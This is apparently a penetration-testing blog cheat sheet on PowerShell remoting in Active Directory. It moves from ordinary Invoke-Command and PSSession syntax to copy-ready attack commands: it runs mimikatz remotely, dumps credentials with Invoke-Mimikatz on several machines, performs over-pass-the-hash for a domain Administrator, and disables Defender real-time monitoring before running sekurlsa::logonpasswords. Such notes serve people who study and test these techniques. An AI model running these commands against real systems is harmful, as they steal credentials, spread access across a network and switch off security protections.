---
title : "PSSession"
author: Bhaskar Pal
date: 2022-04-08 08:05:00 +0010
categories: [Blue-Teaming]
tags: [active-directory,remoting]
---

# <span style="color:lightblue">PowerShell Remoting</span>

* Think of it as psexec on steroids.
* You will found this increasingly used in enterprises. Enabled by default on Server 2012 onwards.
* You may need to enable remoting (**Enable-PSRemoting**) on a Desktop Windows machine, Admin privs are required to do that.
* You get elevated shell on remote system if admin creds are used to authenticate (which is the default setting).

> By default, enabling PowerShell remoting enables both an http and an https listener. The listeners run on default ports **5985 for http and 5986 for https**.
{: .prompt-info }

## <span style="color:lightgreen">Powershell Sessions</span>

In the table below, you can get a brief understanding of the working and usage of the cmdlets we will be using to perform attacks.

| Session Type | Cmdlets | Benifits |
| :--          | :--     | :--      |
| **One-to-One**   | 1. `New-PSSession`<br> 2. `Enter-PSSession` | 1. Interactive <br> 2. Runs in a new process (wsmprovhost) <br> 3. Is Stateful |
| **One-to-Many** | 1. `Invoke-Command` | 1. Non-interactive <br> 2. Executes commands parallely <br> 3. Execution is in disconnected sessions (v3) |

+ Use `-Credential` parameter to pass username/password

```powershell
$pass = ConvertTo-SecureString "Password123!" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<computer-name>", $pass)
```

# <span style="color:lightblue">Enter/New-PSSession Remoting</span>


### <span style="color:#F1C232">1. Connect to a PS-Session of a remote user</span>
```powershell
Enter-PSSession -Computername <computer-name> 
```
### <span style="color:#F1C232">2. Execute Stateful commands using Enter-PSSession ( persistence )</span>
```powershell
$sess = New-PSSession -Computername <computer-name>
Enter-PSSession -Session $sess

[scorp.star.light.local]:PS> $proc = Get-Process
[scorp.star.light.local]:PS> exit

Enter-PSSession -Session $sess

[scorp.star.light.local]:PS> proc
Will list current process
```

# <span style="color:lightblue">Invoke-Command</span>

### <span style="color:#F1C232">1. Execute Stateful commands using Invoke-Command ( persistence )</span>

```powershell
$sess = New-PSSession -Computername <computer-name>
Invoke-Command -Session $sess -ScriptBlock {$proc = Get-Process}
Invoke-Command -Session $sess -ScriptBlock {$proc.Name}
```

### <span style="color:#F1C232">2. Display allowed commands we can execute on remote machine</span>

```powershell
# copy the command snippet with the parameters which are required
Invoke-Command -computername <computer-name> -ConfigurationName <fill-if-required> -credential $cred -command {get-command}
Invoke-Command -computername <computer-name> -credential $cred -command {get-command}
Invoke-Command -computername <computer-name> -command {get-command}
```

### <span style="color:#F1C232">3. Write File using ScriptBlock</span>

```powershell
# copy the command snippet with the parameters which are required
Invoke-Command -ComputerName <computer-name> -ConfigurationName <fill-if-required> -Credential $cred -ScriptBlock {Set-Content -Path 'c:\temp.bat' -Value 'whoami'}
Invoke-Command -ComputerName <computer-name> -Credential $cred -ScriptBlock {Set-Content -Path 'c:\temp.bat' -Value 'whoami'}
Invoke-Command -ComputerName <computer-name> -ScriptBlock {Set-Content -Path 'c:\temp.bat' -Value 'whoami'}
```

### <span style="color:#F1C232">4. Edit file using ScriptBlock</span>

```powershell
# copy the command snippet with the parameters which are required
Invoke-Command -computername <computer-name> -ConfigurationName <fill-if-required> -ScriptBlock {((cat "c:\mention\path\here" -Raw) -replace 'replacing-object','replaced-with-content') | set-content -path c:\mention\same\path\here} -credential $cred
Invoke-Command -computername <computer-name> -ScriptBlock {((cat "c:\mention\path\here" -Raw) -replace 'replacing-object','replaced-with-content') | set-content -path c:\mention\same\path\here} -credential $cred
Invoke-Command -computername <computer-name> -ScriptBlock {((cat "c:\mention\path\here" -Raw) -replace 'replacing-object','replaced-with-content') | set-content -path c:\mention\same\path\here}
```

### <span style="color:#F1C232">5. Command execution using command and ScriptBlock</span>

```powershell
# copy the command snippet with the parameters which are required
Invoke-Command -computername <computer-name> -ConfigurationName <fill-if-required> -credential $cred -command {whoami}
Invoke-Command -computername <computer-name> -ConfigurationName <fill-if-required> -credential $cred -ScriptBlock {whoami}
Invoke-Command -computername <computer-name> -command {whoami}
Invoke-Command -computername <computer-name> -ScriptBlock {whoami}
```

### <span style="color:#F1C232">6. File execution using ScriptBlock</span>

```powershell
# copy the command snippet with the parameters which are required
Invoke-Command -ComputerName <computer-name> -ConfigurationName <fill-if-required> -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
Invoke-Command -ComputerName <computer-name> -Credential $cred -ScriptBlock{"C:\temp\mimikatz.exe"}
Invoke-Command -ComputerName <computer-name> -ScriptBlock{"C:\temp\mimikatz.exe"}
```

### <span style="color:#F1C232">7. File execution using FilePath</span>

```powershell
Invoke-Command -computername <computer-name> -FilePath "C:\temp\mimikatz.exe"
```

### <span style="color:#F1C232">8. Language Mode</span>

```powershell
Invoke-Command -computername <computer-name> -ScriptBlock {$ExecutionContext.SessionState.LanguageMode}
```

> If the value of the LanguageMode is **Constrained**, then it will only allow built-in cmdlets execution
{: .prompt-tip }

## <span style="color:lightgreen">Execute locally loaded function on the remote machines</span>

Example : **Hello.ps1**

```powershell
function hello
{
Write-Output "Hello from the function"
}
```

### <span style="color:#F1C232">1. Now we can load the function on our machine</span>

```powershell
. .\Hello.ps1
```

### <span style="color:#F1C232">2. Now we can execute the locally loaded functions </span>

```powershell
Invoke-Command -ScriptBlock ${function:hello} -ComputerName <computer-name>
```

### <span style="color:#F1C232">3. In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way</span>

```powershell
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list of servers>) -
ArgumentList
```

### <span style="color:#F1C232">4. Directly load function on the remote machines using FilePath</span>

```powershell
$sess = New-PSSession -Computername <computer-name>
Invoke-Command -FilePath "C:\temp\hello.ps1" -Session $sess
Enter-PSSession -Session $sess

[scorp.star.light.local]:PS> hello
Hello from the function
```

# <span style="color:lightblue">Invoke-Mimikatz</span>

* The script could be used to dump credentials, tickets and more using mimikatz with PowerShell without dropping the mimikatz exe to disk.
* It is very useful for passing and replaying hashes, tickets and for many exciting Active Directory attacks.
* Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script.
* The script needs administrative privileges for dumping credentials from local machine. Many attacks need specific privileges which are covered while discussing that attack. 

### <span style="color:#F1C232">1. Dump credentials on a local machine</span>

```powershell
Invoke-Mimikatz -DumpCreds
```

### <span style="color:#F1C232">2. Dump credentials on multiple remote machines</span>

```powershell
Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2")
```

> Invoke-Mimikatz uses PowerShell remoting cmdlet **Invoke-Command** to do above.
{: .prompt-info }

### <span style="color:#F1C232">3. "Over pass the hash" generate tokens from hashes</span>
 
```powershell
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntImhash> /run:powershell.exe"'
```

### <span style="color:#F1C232">4. Create new session and dump hashes</span>

```powershell
#Create a session for remoting system
$sess = New-PSSession -ComputerName <computer-name>

#Bypass AMSI
Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPreference -DisableIOAVProtection $true; whoami} -Session $sess

#Locally load mimikatz on your own system
Import-Module .\Invoke-Mimikatz.ps1

#Execute locally loaded functions remoting system
Invoke-Command -ScriptBlock ${function:Invoke-Mimikatz -command '"sekurlsa::logonpasswords"'} -Session $sess
```


If you find my notes interesting, you can buy me a coffee 

<a href="https://www.buymeacoffee.com/jessefmoore"><img src="https://img.buymeacoffee.com/button-api/?text=Buy me an OSCP?&emoji=&slug=jessefmoore&button_colour=b86e19&font_colour=ffffff&font_family=Poppins&outline_colour=ffffff&coffee_colour=FFDD00" /></a>
